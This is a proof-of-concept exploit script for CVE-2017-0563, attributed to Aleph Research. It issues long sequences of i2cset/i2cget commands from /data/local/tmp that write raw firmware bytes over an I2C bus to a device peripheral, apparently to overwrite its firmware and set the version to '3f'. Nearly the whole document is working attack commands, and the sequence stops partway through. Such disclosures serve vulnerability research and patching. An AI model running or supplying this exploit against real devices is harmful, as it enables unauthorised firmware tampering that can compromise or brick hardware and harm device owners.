#
# PoC for CVE-2017-0563
# Roee Hay / Aleph Research / HCL Technologies
#
# Changes the firmware version to '3f'
#

/data/local/tmp/i2cget -f -y 1 0x5c 0x6
/data/local/tmp/i2cset -f -y 1 0x5c 0x2 0x1 i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x0 0xff 0x38 0x0 0x1 0x2 0x3 0x4 0x5 0x6 0x7 i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x0 i
@200
/data/local/tmp/i2cget -f -y 1 0x60 0x0
/data/local/tmp/i2cget -f -y 1 0x60 0x1
/data/local/tmp/i2cget -f -y 1 0x60 0x2
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x0 0xff 0x39 0x0 0x1 0x2 0x3 0x4 0x5 0x6 0x7 0x0 0x2 0x40 0x40 0x40 0x40 i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x10 0x30 0x7e 0x30 0x30 0x7e 0x30 0x30 0x30 0x7e 0x30 0x30 0x30 0x7e 0x30 0x30 0x30 i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x20 0x7e 0x30 0x30 0x30 0x7e 0x30 0x30 0x30 0x7d 0xb 0x6c 0x7e 0x7e 0x30 0x30 0x30 i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x30 0x7d 0xc 0xab 0x7e 0x7e 0x30 0x30 0x30 0x7e 0x30 0x30 0x30 0x7e 0x30 0x30 0x30 i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x40 0x7e 0x30 0x30 0x30 0x7e 0x30 0x30 0x30 0x7e 0x30 0x30 0x30 0xda 0xa i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x0 i
@200
/data/local/tmp/i2cget -f -y 1 0x60 0x0
/data/local/tmp/i2cget -f -y 1 0x60 0x1
/data/local/tmp/i2cget -f -y 1 0x60 0x2
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x0 0xff 0x39 0x0 0x1 0x2 0x3 0x4 0x5 0x6 0x7 0x0 0x3 0x7e 0x30 0x30 0x30 i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x10 0x7e 0x30 0x30 0x30 0x7e 0x30 0x30 0x30 0x7e 0x30 0x30 0x30 0x7e 0x30 0x30 0x30 i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x20 0x7e 0x30 0x30 0x30 0x7e 0x30 0x30 0x30 0x7e 0x30 0x30 0x30 0x30 0x30 0x30 0x30 i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x30 0x30 0x30 0x30 0x30 0x30 0x30 0x30 0x30 0x30 0x30 0x30 0x30 0x30 0x30 0x30 0x30 i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x40 0x30 0x30 0x30 0x30 0x30 0x30 0x30 0x30 0x7d 0x11 0xa9 0x30 0x17 0x85 i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x0 i
@200
/data/local/tmp/i2cget -f -y 1 0x60 0x0
/data/local/tmp/i2cget -f -y 1 0x60 0x1
/data/local/tmp/i2cget -f -y 1 0x60 0x2
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x0 0xff 0x39 0x0 0x1 0x2 0x3 0x4 0x5 0x6 0x7 0x0 0x4 0x1f 0xdc 0x0 0x80 i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x10 0xa 0x0 0x1f 0x80 0x0 0x2c 0x10 0x0 0x1f 0xff 0x0 0x0 0xff 0xff 0xff 0xff i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x20 0xff 0xff 0xff 0xff 0xc1 0xc2 0xc3 0x0 0x30 0x30 0x30 0x30 0x30 0x30 0x30 0x30 i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x30 0x30 0x30 0x30 0x30 0x30 0x30 0x30 0x30 0x30 0x30 0x30 0x30 0x30 0x30 0x30 0x30 i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x40 0x30 0x30 0x30 0x30 0x30 0x30 0x30 0x30 0x30 0x30 0x30 0x30 0x7c 0x50 i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x0 i
@200
/data/local/tmp/i2cget -f -y 1 0x60 0x0
/data/local/tmp/i2cget -f -y 1 0x60 0x1
/data/local/tmp/i2cget -f -y 1 0x60 0x2
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x0 0xff 0x39 0x0 0x1 0x2 0x3 0x4 0x5 0x6 0x7 0x0 0x5 0x30 0x30 0x30 0x30 i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x10 0x30 0x30 0x30 0x30 0x30 0x30 0x30 0x30 0x30 0x30 0x30 0x30 0x30 0x30 0x30 0x30 i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x20 0x30 0x30 0x30 0x30 0x30 0x30 0x30 0x30 0x30 0x30 0x30 0x30 0x30 0x30 0x30 0x30 i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x30 0x30 0x30 0x30 0x30 0x30 0x30 0x30 0x30 0x30 0x30 0x30 0x30 0x30 0x30 0x30 0x30 i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x40 0x30 0x30 0x30 0x30 0x30 0x30 0x30 0x30 0x30 0x30 0x52 0x69 0x5b 0xf i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x0 i
@200
/data/local/tmp/i2cget -f -y 1 0x60 0x0
/data/local/tmp/i2cget -f -y 1 0x60 0x1
/data/local/tmp/i2cget -f -y 1 0x60 0x2
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x0 0xff 0x39 0x0 0x1 0x2 0x3 0x4 0x5 0x6 0x7 0x0 0x28 0x0 0x0 0x0 0x0 i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x10 0x61 0x0 0xfd 0x0 0xcd 0x0 0xce 0x0 0xa5 0x0 0xa4 0x0 0xa0 0x8 0xa1 0x80 i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x20 0xa2 0x84 0xa3 0x7c 0xa8 0x0 0xa6 0x0 0xa7 0x0 0x7c 0x33 0x7a 0x0 0x7b 0x0 i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x30 0x79 0x0 0x36 0x0 0x37 0x0 0x38 0x0 0x39 0x0 0x3a 0x0 0x3b 0x0 0x3c 0x0 i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x40 0x3d 0x0 0x3e 0x0 0x3f 0x0 0x40 0x0 0x41 0x0 0x42 0x0 0x6e 0x58 i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x0 i
@200
/data/local/tmp/i2cget -f -y 1 0x60 0x0
/data/local/tmp/i2cget -f -y 1 0x60 0x1
/data/local/tmp/i2cget -f -y 1 0x60 0x2
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x0 0xff 0x39 0x0 0x1 0x2 0x3 0x4 0x5 0x6 0x7 0x0 0x29 0x43 0x0 0x44 0x0 i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x10 0x45 0x0 0x46 0x0 0x47 0x0 0x48 0x0 0x49 0x0 0x4a 0x0 0x4b 0x0 0x4c 0x0 i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x20 0x4d 0x0 0x4e 0x0 0x4f 0x0 0xca 0x5c 0xd6 0x4 0xcf 0x0 0xcb 0x0 0xc8 0x1 i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x30 0xcc 0x0 0xc9 0x0 0xd7 0x0 0xa9 0x0 0x2b 0x0 0xb0 0x0 0xb3 0x2 0xb6 0x0 i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x40 0xb2 0x0 0xb5 0x0 0xb8 0x0 0xb1 0x0 0xb4 0x0 0xb7 0x0 0xae 0xd9 i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x0 i
@200
/data/local/tmp/i2cget -f -y 1 0x60 0x0
/data/local/tmp/i2cget -f -y 1 0x60 0x1
/data/local/tmp/i2cget -f -y 1 0x60 0x2
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x0 0xff 0x39 0x0 0x1 0x2 0x3 0x4 0x5 0x6 0x7 0x0 0x2a 0x33 0x0 0x34 0x0 i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x10 0x35 0x0 0xff 0x54 0x0 0x55 0x0 0x56 0x0 0x57 0x0 0x58 0x0 0x59 0x0 0x5a i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x20 0x0 0x5b 0x0 0xdc 0x0 0xe2 0x0 0xd1 0x0 0xdd 0x0 0xd8 0x2 0xd9 0x1 0xda i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x30 0x0 0xdb 0x0 0xdf 0x0 0x29 0x0 0x30 0x0 0xbd 0x0 0xff 0x1e 0xaa 0x70 0xef i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x40 0x62 0x0 0x8 0x71 0x10 0x62 0x0 0x8 0x62 0x1 0x9a 0x70 0x9 0x90 i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x0 i
@200
/data/local/tmp/i2cget -f -y 1 0x60 0x0
/data/local/tmp/i2cget -f -y 1 0x60 0x1
/data/local/tmp/i2cget -f -y 1 0x60 0x2
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x0 0xff 0x39 0x0 0x1 0x2 0x3 0x4 0x5 0x6 0x7 0x0 0x2b 0xef 0x62 0x4 0xa0 i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x10 0x71 0x10 0x62 0x4 0xa0 0x62 0x5 0xbf 0x70 0xef 0x62 0x8 0x0 0x71 0x10 0x62 i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x20 0x8 0x0 0x62 0x9 0x28 0x70 0xef 0x62 0xc 0x0 0x71 0x10 0x62 0xc 0x0 0x62 i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x30 0xd 0x0 0x70 0xef 0x62 0x10 0x0 0x71 0x10 0x62 0x10 0x0 0x62 0x11 0x0 0x70 i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x40 0xef 0x62 0x1 0x0 0x62 0x5 0x0 0x62 0x9 0x0 0x62 0xd 0x4e 0x1b i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x0 i
@200
/data/local/tmp/i2cget -f -y 1 0x60 0x0
/data/local/tmp/i2cget -f -y 1 0x60 0x1
/data/local/tmp/i2cget -f -y 1 0x60 0x2
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x0 0xff 0x39 0x0 0x1 0x2 0x3 0x4 0x5 0x6 0x7 0x0 0x2c 0x0 0x62 0x11 0x0 i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x10 0x70 0xef 0x7f 0x55 0x9 0xa0 0x7c 0xb 0x11 0x7c 0xa 0xb2 0x7f 0x10 0x70 0xef i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x20 0x50 0x0 0x67 0x50 0xa 0x57 0x4 0x7c 0xb 0x2c 0x50 0x1 0x67 0x50 0xa 0x57 i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x30 0x87 0x7c 0xb 0x2c 0x70 0xef 0x20 0x7f 0x38 0x2 0x10 0x8 0x4f 0x56 0xfc 0x0 i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x40 0xd0 0x4 0x56 0xfc 0x1 0x18 0x20 0x70 0xef 0x62 0xe3 0x0 0xc3 0x6 i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x0 i
@200
/data/local/tmp/i2cget -f -y 1 0x60 0x0
/data/local/tmp/i2cget -f -y 1 0x60 0x1
/data/local/tmp/i2cget -f -y 1 0x60 0x2
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x0 0xff 0x39 0x0 0x1 0x2 0x3 0x4 0x5 0x6 0x7 0x0 0x2d 0x10 0x8 0x28 0x39 i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x10 0xff 0xa0 0x1f 0x4f 0x48 0xfc 0x1 0xa0 0x3 0x71 0x10 0x54 0xfd 0x18 0x20 0x75 i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x20 0x9 0x0 0x10 0x8 0x28 0x4f 0x59 0xfd 0x61 0x0 0x18 0x20 0x75 0x9 0x0 0x8f i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x30 0xd7 0x38 0xfc 0x70 0x3f 0x71 0xc0 0x7f 0x8 0x10 0x70 0x3f 0x71 0x80 0x5d 0xd3 i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x40 0x8 0x5d 0xd0 0x8 0x62 0xd0 0x0 0x51 0xd 0x60 0xd3 0x2e 0x1 0x83 i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x0 i
@200
/data/local/tmp/i2cget -f -y 1 0x60 0x0
/data/local/tmp/i2cget -f -y 1 0x60 0x1
/data/local/tmp/i2cget -f -y 1 0x60 0x2
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x0 0xff 0x39 0x0 0x1 0x2 0x3 0x4 0x5 0x6 0x7 0x0 0x2e 0xa 0x80 0x49 0xd7 i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x10 0x8 0xa0 0x9 0x26 0xa 0xf0 0x2e 0xa 0x0 0x80 0x8 0x49 0xd7 0x20 0xa0 0x3 i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x20 0x80 0x99 0x51 0xa 0x21 0xe 0xe0 0x1 0x80 0x11 0x80 0x5a 0x80 0x6c 0x80 0x3a i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x30 0x80 0x89 0x80 0x87 0x80 0x85 0x80 0x83 0x80 0x8a 0x49 0xd8 0x1 0xb0 0xf 0x55 i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x40 0x11 0x2 0x26 0xa 0xf0 0x2e 0xa 0x2 0x62 0xd7 0x10 0x80 0x41 0x4 i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x0 i
@200
/data/local/tmp/i2cget -f -y 1 0x60 0x0
/data/local/tmp/i2cget -f -y 1 0x60 0x1
/data/local/tmp/i2cget -f -y 1 0x60 0x2
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x0 0xff 0x39 0x0 0x1 0x2 0x3 0x4 0x5 0x6 0x7 0x0 0x2f 0x77 0x55 0x11 0x1 i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x10 0x26 0xa 0xf0 0x2e 0xa 0x6 0x5f 0xc 0xb 0x51 0xe 0x2 0xc 0x5c 0x52 0x0 i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x20 0x60 0xd8 0x76 0xc 0x62 0xd7 0x14 0x80 0x5b 0x51 0xf 0x78 0x3a 0xc 0xc0 0xf i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x30 0x51 0xe 0x2 0xc 0x5c 0x52 0x0 0x60 0xd8 0x76 0xc 0x2e 0xa 0x20 0x60 0xd8 i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x40 0x62 0xd7 0x4 0x80 0x3f 0x5d 0xd8 0x3a 0xf 0xd0 0x2b 0xa0 0x16 0xaf i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x0 i
@200
/data/local/tmp/i2cget -f -y 1 0x60 0x0
/data/local/tmp/i2cget -f -y 1 0x60 0x1
/data/local/tmp/i2cget -f -y 1 0x60 0x2
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x0 0xff 0x39 0x0 0x1 0x2 0x3 0x4 0x5 0x6 0x7 0x0 0x30 0x29 0x53 0xc 0x53 i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x10 0xb 0x26 0xa 0xf0 0x2e 0xa 0x4 0x80 0x18 0x51 0x10 0x78 0x3a 0xc 0xc0 0x16 i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x20 0x51 0xe 0x2 0xc 0x5c 0x5d 0xd8 0x54 0x0 0x2e 0xa 0x10 0x76 0xc 0x80 0x1 i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x30 0x62 0xd7 0x10 0x80 0xf 0x62 0xd7 0x0 0x80 0xa 0x26 0xa 0xf0 0x2e 0xa 0x0 i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x40 0x55 0x11 0x0 0x18 0x60 0xd0 0x18 0x60 0xd3 0x20 0x18 0x7e 0xe 0xa0 i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x0 i
@200
/data/local/tmp/i2cget -f -y 1 0x60 0x0
/data/local/tmp/i2cget -f -y 1 0x60 0x1
/data/local/tmp/i2cget -f -y 1 0x60 0x2
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x0 0xff 0x39 0x0 0x1 0x2 0x3 0x4 0x5 0x6 0x7 0x0 0x31 0x62 0xd0 0x0 0x71 i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x10 0x10 0x41 0x4 0x5f 0x43 0x5 0xa0 0x70 0xef 0x26 0x9 0x5f 0x51 0x9 0x60 0x4 i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x20 0x55 0x11 0x0 0x90 0x2a 0x90 0x2f 0x40 0x40 0x40 0x40 0x40 0x50 0x0 0x53 0xb i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x30 0x71 0x10 0x43 0x4 0xa0 0x43 0x5 0xa0 0x70 0xef 0x2e 0x9 0xa0 0x51 0x9 0x60 i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x40 0x4 0x7f 0x62 0xd0 0x0 0x51 0xa 0x21 0xb0 0x26 0xa 0x4f 0x57 0x33 i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x0 i
@200
/data/local/tmp/i2cget -f -y 1 0x60 0x0
/data/local/tmp/i2cget -f -y 1 0x60 0x1
/data/local/tmp/i2cget -f -y 1 0x60 0x2
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x0 0xff 0x39 0x0 0x1 0x2 0x3 0x4 0x5 0x6 0x7 0x0 0x32 0x7f 0x80 0x4 0x41 i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x10 0xe0 0x7f 0x43 0xe0 0x80 0x7f 0x43 0xd6 0x31 0x7f 0x41 0xe0 0x7f 0x7f 0x62 0xd0 i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x20 0x0 0x4f 0x52 0xfd 0x53 0xf 0x52 0xfc 0x53 0x10 0x52 0xfb 0x53 0xe 0x52 0xfa i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x30 0x53 0xd 0x70 0x3f 0x71 0xc0 0x7f 0x8 0x5d 0xa4 0x4 0x2f 0x5d 0xa5 0xc 0x2e i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x40 0x55 0x30 0x1 0x18 0x7e 0x70 0xbf 0x62 0xd0 0x0 0x70 0xbf 0x6d 0x60 i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x0 i
@200
/data/local/tmp/i2cget -f -y 1 0x60 0x0
/data/local/tmp/i2cget -f -y 1 0x60 0x1
/data/local/tmp/i2cget -f -y 1 0x60 0x2
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x0 0xff 0x39 0x0 0x1 0x2 0x3 0x4 0x5 0x6 0x7 0x0 0x33 0x53 0x32 0x64 0x5c i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x10 0x62 0xd3 0x0 0x52 0x8e 0x62 0xd3 0x0 0x13 0x82 0x62 0xd3 0x0 0x54 0x84 0x62 i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x20 0xd3 0x0 0x52 0x8d 0x62 0xd3 0x0 0x1b 0x81 0x62 0xd3 0x0 0x54 0x83 0xc0 0x33 i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x30 0x3d 0x83 0x0 0xb0 0x7b 0x51 0x12 0x3b 0x84 0xc0 0x75 0x52 0x84 0x58 0x32 0x1 i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x40 0x0 0x6d 0x62 0xd3 0x0 0x5 0x7c 0xc0 0x9 0x51 0x14 0x3b 0x44 0xf i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x0 i
@200
/data/local/tmp/i2cget -f -y 1 0x60 0x0
/data/local/tmp/i2cget -f -y 1 0x60 0x1
/data/local/tmp/i2cget -f -y 1 0x60 0x2
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x0 0xff 0x39 0x0 0x1 0x2 0x3 0x4 0x5 0x6 0x7 0x0 0x34 0x7c 0xd0 0x12 0xa0 i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x10 0x10 0x56 0x7c 0x0 0x5b 0x64 0x5c 0x62 0xd3 0x0 0x7 0x82 0x1 0xf 0x81 0x0 i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x20 0x80 0x41 0x3d 0x83 0xff 0xb0 0x9 0x50 0xff 0x12 0x13 0x3b 0x84 0xc0 0x20 0x62 i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x30 0xd3 0x0 0x56 0x84 0x0 0x56 0x83 0x0 0x5b 0x67 0x5c 0x62 0xd3 0x0 0x52 0x80 i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x40 0x78 0xd0 0x3 0x50 0x0 0x54 0x80 0x8 0x5b 0x64 0x5c 0x18 0x4d 0x22 i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x0 i
@200
/data/local/tmp/i2cget -f -y 1 0x60 0x0
/data/local/tmp/i2cget -f -y 1 0x60 0x1
/data/local/tmp/i2cget -f -y 1 0x60 0x2
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x0 0xff 0x39 0x0 0x1 0x2 0x3 0x4 0x5 0x6 0x7 0x0 0x35 0xb0 0x2c 0x62 0xd3 i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x10 0x0 0x52 0x8e 0x62 0xd3 0x0 0x54 0x82 0x62 0xd3 0x0 0x52 0x8d 0x62 0xd3 0x0 i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x20 0x54 0x81 0x51 0x32 0x64 0x5c 0x62 0xd3 0x0 0x56 0x84 0x0 0x56 0x83 0x0 0x5b i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x30 0x67 0x5c 0x62 0xd3 0x0 0x51 0x17 0x54 0x80 0x70 0x3f 0x71 0xc0 0x7f 0x70 0xbf i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x40 0x62 0xd0 0x0 0x70 0xbf 0x8 0x5c 0x62 0xd3 0x0 0x52 0x7d 0x2b 0xdf i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x0 i
@200
/data/local/tmp/i2cget -f -y 1 0x60 0x0
/data/local/tmp/i2cget -f -y 1 0x60 0x1
/data/local/tmp/i2cget -f -y 1 0x60 0x2
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x0 0xff 0x39 0x0 0x1 0x2 0x3 0x4 0x5 0x6 0x7 0x0 0x36 0x53 0x1e 0x55 0x1d i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x10 0x0 0x18 0x8 0x90 0x7e 0x62 0xd3 0x0 0x23 0x7e 0xb0 0x2c 0x51 0x15 0x4 0x1e i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x20 0xe 0x1d 0x0 0x18 0x64 0x5c 0x62 0xd3 0x0 0x52 0x84 0x12 0x1e 0x52 0x83 0x1a i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x30 0x1d 0xc0 0x39 0x5b 0x67 0x5c 0x62 0xd3 0x0 0x52 0x7f 0x78 0x54 0x7f 0x8 0x5b i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x40 0x64 0x5c 0x18 0xb0 0x3e 0x80 0x18 0x51 0x15 0x14 0x1e 0x1e 0x74 0x72 i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x0 i
@200
/data/local/tmp/i2cget -f -y 1 0x60 0x0
/data/local/tmp/i2cget -f -y 1 0x60 0x1
/data/local/tmp/i2cget -f -y 1 0x60 0x2
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x0 0xff 0x39 0x0 0x1 0x2 0x3 0x4 0x5 0x6 0x7 0x0 0x37 0x1d 0x0 0x18 0x64 i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x10 0x5c 0x62 0xd3 0x0 0x52 0x84 0x12 0x1e 0x52 0x83 0x1a 0x1d 0xc0 0xe 0x5b 0x67 i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x20 0x90 0x31 0x62 0xd3 0x0 0x2d 0x7e 0x50 0x1 0x80 0x24 0x5b 0x67 0x8 0x90 0x23 i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x30 0x73 0x62 0xd3 0x0 0x25 0x7e 0x62 0xd3 0x0 0x20 0x51 0x16 0x54 0x7f 0x50 0x0 i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x40 0x80 0xd 0x5b 0x67 0x90 0xd 0x73 0x62 0xd3 0x0 0x25 0x7e 0x40 0xb i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x0 i
@200
/data/local/tmp/i2cget -f -y 1 0x60 0x0
/data/local/tmp/i2cget -f -y 1 0x60 0x1
/data/local/tmp/i2cget -f -y 1 0x60 0x2
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x0 0xff 0x39 0x0 0x1 0x2 0x3 0x4 0x5 0x6 0x7 0x0 0x38 0x50 0x0 0x70 0x3f i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x10 0x71 0xc0 0x7f 0x8 0x67 0x67 0x67 0x5c 0x18 0x21 0x7 0xf0 0x1 0x7f 0x1 0x2 i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x20 0x4 0x8 0x10 0x20 0x40 0x80 0x70 0xbf 0x50 0x0 0x8 0x92 0xb0 0x70 0xbf 0x18 i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x30 0x8 0x64 0x5c 0x62 0xd3 0x0 0x52 0x8e 0x62 0xd3 0x0 0x54 0x82 0x62 0xd3 0x0 i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x40 0x52 0x8d 0x62 0xd3 0x0 0x54 0x81 0x18 0x78 0xdf 0xe0 0x70 0xcc 0x24 i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x0 i
@200
/data/local/tmp/i2cget -f -y 1 0x60 0x0
/data/local/tmp/i2cget -f -y 1 0x60 0x1
/data/local/tmp/i2cget -f -y 1 0x60 0x2
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x0 0xff 0x39 0x0 0x1 0x2 0x3 0x4 0x5 0x6 0x7 0x0 0x39 0x3f 0x71 0xc0 0x7f i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x10 0x62 0xd0 0x0 0x55 0x19 0x0 0x50 0x0 0x8 0x9f 0x23 0x39 0x1 0xb0 0x4 0x55 i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x20 0x19 0x1 0x18 0x78 0xdf 0xf3 0x51 0x19 0x7f 0x50 0x0 0x8 0x9e 0x57 0x18 0x78 i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x30 0xdf 0xfa 0x7f 0x50 0xff 0x3c 0x24 0x80 0xc0 0x11 0x34 0x26 0x76 0x26 0x34 0x25 i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x40 0xe 0x25 0x0 0x34 0x24 0xe 0x24 0x0 0x53 0x23 0x50 0x0 0x58 0x3d i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x0 i
@200
/data/local/tmp/i2cget -f -y 1 0x60 0x0
/data/local/tmp/i2cget -f -y 1 0x60 0x1
/data/local/tmp/i2cget -f -y 1 0x60 0x2
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x0 0xff 0x39 0x0 0x1 0x2 0x3 0x4 0x5 0x6 0x7 0x0 0x3a 0x53 0x27 0x53 0x28 i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x10 0x53 0x29 0x53 0x2a 0x55 0x2d 0x18 0x65 0x26 0x6b 0x25 0x6b 0x24 0x6b 0x2a 0x6b i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x20 0x29 0x6b 0x28 0x51 0x2a 0x1a 0x20 0x51 0x29 0x1a 0x1f 0x51 0x28 0x19 0x0 0xc0 i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x30 0xd 0x53 0x28 0x51 0x20 0x14 0x2a 0x51 0x1f 0x1c 0x29 0x76 0x26 0x7a 0x2d 0xbf i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x40 0xd7 0x50 0xff 0x3c 0x23 0x80 0xc0 0x11 0x34 0x26 0x76 0x26 0x62 0x52 i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x0 i
@200
/data/local/tmp/i2cget -f -y 1 0x60 0x0
/data/local/tmp/i2cget -f -y 1 0x60 0x1
/data/local/tmp/i2cget -f -y 1 0x60 0x2
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x0 0xff 0x39 0x0 0x1 0x2 0x3 0x4 0x5 0x6 0x7 0x0 0x3b 0x34 0x25 0xe 0x25 i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x10 0x0 0x34 0x24 0xe 0x24 0x0 0x34 0x23 0x7f 0x50 0x0 0x53 0x27 0x53 0x28 0x1 i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x20 0x10 0x53 0x2d 0x47 0x2c 0x1 0xa0 0x9 0x51 0x26 0x4 0x28 0x51 0x25 0xc 0x27 i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x30 0x6e 0x27 0x6e 0x28 0x6e 0x2b 0x6e 0x2c 0x7a 0x2d 0xbf 0xe8 0x7f 0x98 0x90 0x91 i
